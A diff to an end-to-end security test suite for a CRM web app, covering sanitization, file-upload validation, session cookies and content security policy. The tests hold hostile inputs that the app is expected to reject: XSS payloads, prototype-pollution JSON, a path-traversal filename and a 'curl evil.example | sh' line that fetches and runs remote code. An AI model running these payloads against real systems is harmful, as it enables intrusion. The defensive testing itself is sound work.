@@ -9,11 +9,14 @@
 import assert from 'node:assert/strict'
 import http from 'node:http'
 import { before, describe, it } from 'node:test'
+import { deflateRawSync } from 'node:zlib'
 
 const BASE = new URL(process.env.BASE_URL || 'http://localhost:3000')
 const EXPECT_SECURE = process.env.E2E_EXPECT_SECURE === 'true'
 const PASSWORD = 'correct horse battery staple'
 const OBJECT_ID = '000000000000000000000000'
+// A Secure session cookie carries the __Host- prefix.
+const COOKIE_NAME = EXPECT_SECURE ? '__Host-crm_session' : 'crm_session'
 
 // Low-level request so we control every header (Origin, Referer, Content-Type, cookies).
 // Pass origin: null to send no Origin header at all.
@@ -39,7 +42,7 @@ function request(method, path, { body, raw, cookie, origin = BASE.origin, header
           // Not JSON (HTML pages, plain-text framework errors).
         }
         const setCookie = res.headers['set-cookie'] || []
-        const session = setCookie.map((c) => c.split(';')[0]).find((c) => c.startsWith('crm_session='))
+        const session = setCookie.map((c) => c.split(';')[0]).find((c) => c.startsWith(`${COOKIE_NAME}=`))
         resolve({ status: res.statusCode, headers: res.headers, setCookie, text, data, session })
       })
     })
@@ -83,6 +86,9 @@ describe('unauthenticated access', () => {
     ['POST', `/api/clients/${OBJECT_ID}/notes`],
     ['DELETE', `/api/notes/${OBJECT_ID}`],
     ['GET', '/api/news?company=x'],
+    ['GET', `/api/clients/${OBJECT_ID}/files`],
+    ['GET', `/api/files/${OBJECT_ID}`],
+    ['DELETE', `/api/files/${OBJECT_ID}`],
     ['GET', '/api/users'],
     ['POST', '/api/users'],
     ['PATCH', `/api/users/${OBJECT_ID}`],
@@ -143,7 +149,7 @@ describe('first-run setup', () => {
 describe('session cookie', () => {
   it('is HttpOnly, SameSite=Lax, path-scoped, and has no Domain', async () => {
     const res = await login(state.admin.email)
-    const header = res.setCookie.find((c) => c.startsWith('crm_session='))
+    const header = res.setCookie.find((c) => c.startsWith(`${COOKIE_NAME}=`))
     assert.match(header, /;\s*HttpOnly/i)
     assert.match(header, /;\s*SameSite=Lax/i)
     assert.match(header, /;\s*Path=\//i)
@@ -442,6 +448,7 @@ describe('redirects and pages', () => {
 
   it('never redirects to another site after login (open redirect)', async () => {
     const cookie = state.admin.cookie
+    // eslint-disable-next-line no-script-url -- a hostile input on purpose
     for (const next of ['//evil.example', 'https://evil.example', '/\\evil.example', 'javascript:alert(1)']) {
       const res = await get(`/login?next=${encodeURIComponent(next)}`, { cookie })
       assert.equal(res.status, 307, `next=${next}`)
@@ -522,5 +529,284 @@ describe('response headers and information leakage', () => {
     const res = await get('/api/news?company[$ne]=x', { cookie: state.admin.cookie })
     assert.equal(res.status, 200)
     assert.deepEqual(res.data.data, [])
+  })
+})
+
+describe('text sanitization', () => {
+  it('strips markup from customer fields on create', async () => {
+    const res = await post('/api/clients', {
+      name: '<script>alert(1)</script>Acme <img src=x onerror=alert(1)>Corp',
+      company: '<b>Bold</b> <a href="javascript:alert(1)">Industries</a>',
+    }, { cookie: state.admin.cookie })
+    assert.equal(res.status, 201)
+    assert.equal(res.data.data.name, 'alert(1)Acme Corp')
+    assert.equal(res.data.data.company, 'Bold Industries')
+    state.sanitized = res.data.data
+  })
+
+  it('strips markup on update too', async () => {
+    const res = await request('PUT', `/api/clients/${state.sanitized._id}`, {
+      body: { company: '<iframe src="javascript:alert(1)"></iframe>Evil Inc' }, cookie: state.admin.cookie,
+    })
+    assert.equal(res.status, 200)
+    assert.equal(res.data.data.company, 'Evil Inc')
+  })
+
+  it('cannot be defeated by nesting tags', async () => {
+    const res = await post('/api/clients', { name: '<scr<b>ipt>alert(1)</scr</b>ipt>Nested' }, { cookie: state.admin.cookie })
+    assert.equal(res.status, 201)
+    assert.doesNotMatch(res.data.data.name, /</)
+  })
+
+  it('keeps innocent angle brackets', async () => {
+    const res = await post('/api/clients', { name: 'Math Co', company: 'a < b and c > d' }, { cookie: state.admin.cookie })
+    assert.equal(res.status, 201)
+    assert.equal(res.data.data.company, 'a < b and c > d')
+  })
+
+  it('removes bidi overrides and zero-width characters', async () => {
+    const res = await post('/api/clients', { name: 'Tro‮jan​ Hor⁦se' }, { cookie: state.admin.cookie })
+    assert.equal(res.status, 201)
+    assert.equal(res.data.data.name, 'Trojan Horse')
+  })
+
+  it('a value that is nothing but markup is treated as empty', async () => {
+    const res = await post('/api/clients', { name: '<b></b><script></script>' }, { cookie: state.admin.cookie })
+    assert.equal(res.status, 400)
+  })
+
+  it('strips markup from notes but keeps their line breaks', async () => {
+    const res = await post(`/api/clients/${state.sanitized._id}/notes`, {
+      text: 'Called <script>steal()</script>them\n\nFollow up <img src=x onerror=alert(1)>Friday',
+    }, { cookie: state.admin.cookie })
+    assert.equal(res.status, 201)
+    assert.equal(res.data.data.text, 'Called steal()them\n\nFollow up Friday')
+  })
+
+  it('rejects JSON bodies carrying prototype-pollution keys', async () => {
+    const cookie = state.admin.cookie
+    for (const raw of [
+      '{"name":"x","__proto__":{"isAdmin":true}}',
+      '{"name":"x","constructor":{"prototype":{"isAdmin":true}}}',
+      '{"name":"x","nested":{"deeper":{"__proto__":{"a":1}}}}',
+    ]) {
+      const res = await post('/api/clients', undefined, { cookie, raw })
+      assert.equal(res.status, 400, raw)
+    }
+  })
+})
+
+// --- File attachments -------------------------------------------------------------
+
+const PNG = Buffer.from(
+  '89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8ffff3f0005fe02fea7d69c3f0000000049454e44ae426082',
+  'hex'
+)
+const PDF = Buffer.from('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n')
+
+// Minimal ZIP writer, enough to build Office documents: [name, content, method].
+function zip(entries) {
+  const locals = []
+  const centrals = []
+  let offset = 0
+  for (const [name, content, method = 8] of entries) {
+    const raw = Buffer.from(content)
+    const data = method === 8 ? deflateRawSync(raw) : raw
+    const fileName = Buffer.from(name)
+    const local = Buffer.alloc(30)
+    local.writeUInt32LE(0x04034b50, 0)
+    local.writeUInt16LE(method, 8)
+    local.writeUInt32LE(data.length, 18)
+    local.writeUInt32LE(raw.length, 22)
+    local.writeUInt16LE(fileName.length, 26)
+    const central = Buffer.alloc(46)
+    central.writeUInt32LE(0x02014b50, 0)
+    central.writeUInt16LE(method, 10)
+    central.writeUInt32LE(data.length, 20)
+    central.writeUInt32LE(raw.length, 24)
+    central.writeUInt16LE(fileName.length, 28)
+    central.writeUInt32LE(offset, 42)
+    locals.push(local, fileName, data)
+    centrals.push(central, fileName)
+    offset += 30 + fileName.length + data.length
+  }
+  const directory = Buffer.concat(centrals)
+  const end = Buffer.alloc(22)
+  end.writeUInt32LE(0x06054b50, 0)
+  end.writeUInt16LE(entries.length, 8)
+  end.writeUInt16LE(entries.length, 10)
+  end.writeUInt32LE(directory.length, 12)
+  end.writeUInt32LE(offset, 16)
+  return Buffer.concat([...locals, directory, end])
+}
+const contentTypes = (main) =>
+  `<?xml version="1.0"?><Types><Override PartName="/word/document.xml" ContentType="${main}"/></Types>`
+const DOCX_MAIN = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'
+const DOCM_MAIN = 'application/vnd.ms-word.document.macroEnabled.main+xml'
+const DOCX = zip([['[Content_Types].xml', contentTypes(DOCX_MAIN)], ['word/document.xml', '<w:document/>']])
+
+function uploadTo(clientId, name, bytes, { cookie = state.admin.cookie, origin, contentType = 'application/octet-stream' } = {}) {
+  return post(`/api/clients/${clientId}/files?name=${encodeURIComponent(name)}`, undefined, {
+    cookie, origin, raw: bytes, contentType,
+  })
+}
+
+async function makeMember(name, email) {
+  const created = await post('/api/users', { name, email, role: 'member' }, { cookie: state.admin.cookie })
+  assert.equal(created.status, 201)
+  const first = await login(email, created.data.data.temporaryPassword)
+  const changed = await post('/api/auth/change-password', {
+    currentPassword: created.data.data.temporaryPassword, newPassword: PASSWORD,
+  }, { cookie: first.session })
+  assert.equal(changed.status, 200)
+  return { cookie: changed.session, id: created.data.data.user.id }
+}
+
+describe('file attachments', () => {
+  before(async () => {
+    const client = await post('/api/clients', { name: 'Files Customer' }, { cookie: state.admin.cookie })
+    assert.equal(client.status, 201)
+    state.filesClient = client.data.data._id
+    state.uploader = await makeMember('Uma Uploader', 'uma@example.test')
+  })
+
+  it('accepts real images, PDFs, Office documents, and CSV, typed from their bytes', async () => {
+    const cases = [
+      ['photo.png', PNG, 'image/png', 'image', 'photo.png'],
+      ['contract.pdf', PDF, 'application/pdf', 'document', 'contract.pdf'],
+      ['proposal.docx', DOCX, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'document', 'proposal.docx'],
+      ['leads.csv', Buffer.from('name,email\nAda,ada@example.test\n'), 'text/csv; charset=utf-8', 'text', 'leads.csv'],
+      // The claimed extension is ignored: these bytes are a PNG, so it is stored as one.
+      ['misnamed.pdf', PNG, 'image/png', 'image', 'misnamed.png'],
+    ]
+    state.files = {}
+    for (const [name, bytes, contentType, kind, stored] of cases) {
+      const res = await uploadTo(state.filesClient, name, bytes)
+      assert.equal(res.status, 201, `${name}: ${res.text}`)
+      assert.equal(res.data.data.contentType, contentType, name)
+      assert.equal(res.data.data.kind, kind, name)
+      assert.equal(res.data.data.filename, stored, name)
+      assert.equal(res.data.data.size, bytes.length, name)
+      assert.equal(res.data.data.fileId, undefined, 'internal storage ids are not exposed')
+      state.files[name] = res.data.data
+    }
+  })
+
+  it('rejects scripts, executables, markup, and macro documents, whatever they are named', async () => {
+    const hostile = [
+      ['JavaScript renamed to .png', 'avatar.png', Buffer.from('fetch("/api/users").then(r=>r.text()).then(alert)')],
+      ['Python file', 'tool.py', Buffer.from('import os\nos.system("id")\n')],
+      ['shebang script renamed to .txt', 'notes.txt', Buffer.from('#!/bin/sh\ncurl evil.example | sh\n')],
+      ['HTML renamed to .txt', 'readme.txt', Buffer.from('<!doctype html><script>alert(1)</script>')],
+      ['SVG with script', 'logo.svg', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')],
+      ['Windows executable', 'invoice.pdf', Buffer.from('4d5a90000300000004000000ffff0000', 'hex')],
+      ['ELF binary', 'photo.jpg', Buffer.from('7f454c46020101000000000000000000', 'hex')],
+      ['PNG/HTML polyglot', 'polyglot.png', Buffer.concat([PNG, Buffer.from('<script>alert(1)</script>')])],
+      ['GIF/SVG polyglot', 'polyglot.gif', Buffer.from('GIF89a/*<svg onload=alert(1)>*/')],
+      ['macro-enabled Word document', 'report.docx', zip([['[Content_Types].xml', contentTypes(DOCM_MAIN)], ['word/document.xml', '<w/>']])],
+      ['Word document with a VBA project', 'report.docx', zip([['[Content_Types].xml', contentTypes(DOCX_MAIN)], ['word/vbaProject.bin', 'x']])],
+      ['Word document with an embedded executable', 'report.docx', zip([['[Content_Types].xml', contentTypes(DOCX_MAIN)], ['word/embeddings/run.exe', 'MZ']])],
+      ['plain ZIP archive', 'archive.docx', zip([['payload.js', 'alert(1)']])],
+    ]
+    const before = (await get(`/api/clients/${state.filesClient}/files`, { cookie: state.admin.cookie })).data.data.length
+    for (const [label, name, bytes] of hostile) {
+      const res = await uploadTo(state.filesClient, name, bytes)
+      assert.equal(res.status, 415, `${label} should be rejected, got ${res.status}`)
+    }
+    const after = (await get(`/api/clients/${state.filesClient}/files`, { cookie: state.admin.cookie })).data.data.length
+    assert.equal(after, before, 'nothing is stored for a rejected upload')
+  })
+
+  it('flattens path traversal and markup in filenames', async () => {
+    const traversal = await uploadTo(state.filesClient, '../../../etc/passwd.txt', Buffer.from('just text\n'))
+    assert.equal(traversal.status, 201)
+    assert.equal(traversal.data.data.filename, 'passwd.txt')
+    const marked = await uploadTo(state.filesClient, '<img src=x onerror=alert(1)>.png', PNG)
+    assert.equal(marked.status, 201)
+    assert.equal(marked.data.data.filename, 'file.png')
+    state.files.text = traversal.data.data
+  })
+
+  it('refuses oversized and empty uploads', async () => {
+    const big = await uploadTo(state.filesClient, 'big.pdf', Buffer.concat([PDF, Buffer.alloc(10 * 1024 * 1024)]))
+    assert.equal(big.status, 413)
+    const empty = await uploadTo(state.filesClient, 'empty.txt', Buffer.alloc(0))
+    assert.equal(empty.status, 400)
+  })
+
+  it('upload keeps the CSRF, content-type, and auth checks', async () => {
+    assert.equal((await uploadTo(state.filesClient, 'a.png', PNG, { origin: 'http://evil.example' })).status, 403)
+    // Forms can send multipart/form-data cross-site; only a raw octet-stream is accepted.
+    assert.equal((await uploadTo(state.filesClient, 'a.png', PNG, { contentType: 'multipart/form-data; boundary=x' })).status, 415)
+    assert.equal((await uploadTo(state.filesClient, 'a.png', PNG, { contentType: 'application/json' })).status, 415)
+    assert.equal((await uploadTo(state.filesClient, 'a.png', PNG, { cookie: null })).status, 401)
+    assert.equal((await uploadTo(OBJECT_ID, 'a.png', PNG)).status, 404)
+  })
+
+  it('serves files as downloads with the detected type and a locked-down policy', async () => {
+    const pdf = await get(`/api/files/${state.files['contract.pdf']._id}`, { cookie: state.admin.cookie })
+    assert.equal(pdf.status, 200)
+    assert.equal(pdf.headers['content-type'], 'application/pdf')
+    assert.match(pdf.headers['content-disposition'], /^attachment; filename="contract\.pdf"/)
+    assert.equal(pdf.headers['x-content-type-options'], 'nosniff')
+    assert.match(pdf.headers['content-security-policy'], /default-src 'none'.*sandbox/)
+    assert.equal(pdf.text, PDF.toString())
+
+    // Images download too if navigated to; <img src> still renders them.
+    const image = await get(`/api/files/${state.files['photo.png']._id}`, { cookie: state.admin.cookie })
+    assert.equal(image.headers['content-type'], 'image/png')
+    assert.match(image.headers['content-disposition'], /^attachment;/)
+
+    assert.equal((await get(`/api/files/${state.files['photo.png']._id}`)).status, 401)
+    assert.equal((await get(`/api/files/${OBJECT_ID}`, { cookie: state.admin.cookie })).status, 404)
+  })
+
+  it('file deletion: uploaders and admins only', async () => {
+    const mine = await uploadTo(state.filesClient, 'mine.png', PNG, { cookie: state.uploader.cookie })
+    assert.equal(mine.status, 201)
+    assert.equal(mine.data.data.createdBy._id, state.uploader.id)
+
+    const adminFile = state.files['photo.png']._id
+    assert.equal((await request('DELETE', `/api/files/${adminFile}`, { cookie: state.uploader.cookie })).status, 403)
+    assert.equal((await request('DELETE', `/api/files/${mine.data.data._id}`, { cookie: state.uploader.cookie })).status, 200)
+    assert.equal((await get(`/api/files/${mine.data.data._id}`, { cookie: state.admin.cookie })).status, 404)
+
+    const theirs = await uploadTo(state.filesClient, 'theirs.png', PNG, { cookie: state.uploader.cookie })
+    assert.equal((await request('DELETE', `/api/files/${theirs.data.data._id}`, { cookie: state.admin.cookie })).status, 200)
+  })
+
+  it('deleting a customer deletes their files', async () => {
+    const ids = Object.values(state.files).map((file) => file._id)
+    const removed = await request('DELETE', `/api/clients/${state.filesClient}`, { cookie: state.admin.cookie })
+    assert.equal(removed.status, 200)
+    for (const id of ids) {
+      assert.equal((await get(`/api/files/${id}`, { cookie: state.admin.cookie })).status, 404)
+    }
+  })
+})
+
+describe('content security policy', () => {
+  it('forbids injected stylesheets, frames, and plugins, and reports violations', async () => {
+    const { headers } = await get('/login')
+    const directives = headers['content-security-policy'].split(';').map((d) => d.trim())
+    assert.ok(directives.includes("style-src-elem 'self'"), 'no inline <style> elements')
+    assert.ok(directives.includes("style-src-attr 'unsafe-inline'"))
+    assert.ok(directives.includes("frame-src 'none'"))
+    assert.ok(directives.includes('report-uri /api/csp-report'))
+    const reportOnly = headers['content-security-policy-report-only']
+    assert.match(reportOnly, /require-trusted-types-for 'script'/)
+  })
+
+  it('ships no inline <style> elements (so style-src-elem can forbid them)', async () => {
+    const { text } = await get('/login')
+    assert.doesNotMatch(text, /<style[\s>]/)
+  })
+
+  it('accepts violation reports without a session and nothing else', async () => {
+    const report = JSON.stringify({ 'csp-report': { 'document-uri': `${BASE.origin}/`, 'effective-directive': 'script-src-elem', 'blocked-uri': 'inline' } })
+    const ok = await post('/api/csp-report', undefined, { origin: null, raw: report, contentType: 'application/csp-report' })
+    assert.equal(ok.status, 204)
+    assert.equal((await get('/api/csp-report')).status, 405)
+    assert.equal((await post('/api/csp-report', undefined, { raw: 'x', contentType: 'text/plain' })).status, 415)
   })
 })
